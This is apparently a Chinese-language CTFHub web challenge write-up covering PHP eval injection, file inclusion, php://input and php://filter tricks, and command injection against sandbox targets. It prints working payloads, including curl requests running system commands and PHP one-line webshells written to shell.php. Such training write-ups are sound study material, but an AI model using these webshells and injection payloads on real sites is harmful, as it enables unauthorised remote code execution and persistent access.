---
title: CTFHub WriteUp
date: 2026-07-28
tags: [writeup]
---

# CTFHub WriteUp(web)



### RCE

---

#### 1、eval执行

打开靶场，eval()函数将传入的cmd参数当作php代码执行

![image-20260723120055420](../assets/CTFHub%20WriteUp/image-20260723120055420.png)

这里直接提示可通过参数cmd传入php代码，打开cmd

```
curl "http://challenge-0a8ae9745c8d5abd.sandbox.ctfhub.com:10800/?cmd=system('ls+/');"
```

![image-20260723120257551](../assets/CTFHub%20WriteUp/image-20260723120257551.png)

url中+代替空格，`ls /`查看根目录，发现目录flag_30687，cat查看

```
curl "http://challenge-0a8ae9745c8d5abd.sandbox.ctfhub.com:10800/?cmd=system('cat+/flag_30687');"
```

![image-20260723120743960](../assets/CTFHub%20WriteUp/image-20260723120743960.png)

找到flag

也可以传入一句话木马，用webshell连接

```
cmd= fputs(fopen('1.php','w'),'<?php @eval(_POST\[123\]);?\>');
```



---



#### 2、文件包含

打开提示file传参

![image-20260728204356971](../assets/CTFHub%20WriteUp/image-20260728204356971.png)

shell.txt内容是一句话木马

![image-20260728204143987](../assets/CTFHub%20WriteUp/image-20260728204143987.png)

构造url

```
/?file=shell.txt
```

![image-20260728204226339](../assets/CTFHub%20WriteUp/image-20260728204226339.png)

用蚁剑连接

![image-20260728204059960](../assets/CTFHub%20WriteUp/image-20260728204059960.png)

找到flag

![image-20260728204426633](../assets/CTFHub%20WriteUp/image-20260728204426633.png)



---



#### 3、php://input

提示php://伪协议

![image-20260728211044283](../assets/CTFHub%20WriteUp/image-20260728211044283.png)

打开phpinfo，允许文件包含，可以执行远程代码

![image-20260728211111992](../assets/CTFHub%20WriteUp/image-20260728211111992.png)

bp抓包改包

头部改成post请求，使用php://input伪协议

```
POST /?file=php://input HTTP/1.1
```

请求体中创建shell.php，写入一句话木马

```
<?php file_put_contents('shell.php', '<?php @eval($_POST["cmd"]);?>');?>
```

蚁剑连接`/shell.php`

找到flag



---



#### 4、远程包含

可以同3、php://input

如果有自己的服务器，可以传递服务器上的木马文件，再用蚁剑远程连接



---



#### 5、读取源代码

```
?file=php://filter/resource=/flag
```

![image-20260728223734129](../assets/CTFHub%20WriteUp/image-20260728223734129.png)

##### php://伪协议

[PHP伪协议深度解析：绕过限制与安全风险-CSDN博客](https://blog.csdn.net/cosmoslin/article/details/120695429)



---



#### 6、CTFHub 命令注入

提示无过滤

构造payload，写入一句话木马

```
127.0.0.1 &echo "<?php @eval(\$_POST['123']);?>" >> shell.php
```

蚁剑连接

or

```
127.0.0.1 | ls
127.0.0.1 | cat 
```

浏览器将内容当html处理了，查看页面源码就能看到

![image-20260728223049644](../assets/CTFHub%20WriteUp/image-20260728223049644.png)



---

